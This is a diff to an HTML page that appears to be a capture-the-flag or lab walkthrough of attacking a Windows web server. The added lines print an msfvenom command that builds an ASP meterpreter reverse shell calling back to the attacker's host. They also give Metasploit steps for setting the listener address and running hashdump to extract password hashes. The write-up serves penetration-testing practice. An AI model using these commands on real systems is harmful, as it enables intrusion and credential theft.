@@ -103,7 +103,19 @@ We downloaded the data to look for clues</p>
 <p>Since we are able to put files and execute them, we can add malware to the website
 We are going to generate a malware, with msfvenom source.
 Since it is a windows server we know it is using ASP
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your ip Address> LPORT=<Your Port to Connect On> -f asp > shell.asp</p>
+<p>
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;your_ip_address&gt; LPORT=&lt;your_port&gt; -f asp &gt; shell.asp
+</p>
+<p>
+    In Metasploit, use the following commands:
+</p>
+<p>
+    show options &rarr; set lhost 10.10.14.14
+</p>
+<p>
+    meterpreter &gt; hashdump
+</p>
+
 <img src="images//devil/images//devil/21_image_6.png" />
 <p>The above image did not work, we dont know if the windows system is a x64 or x86. WHen trying the above command our multi handler was listening and nothing happend. We then tried to do it again with a x86.</p>
 <img src="images//devil/21_image_7.png" />
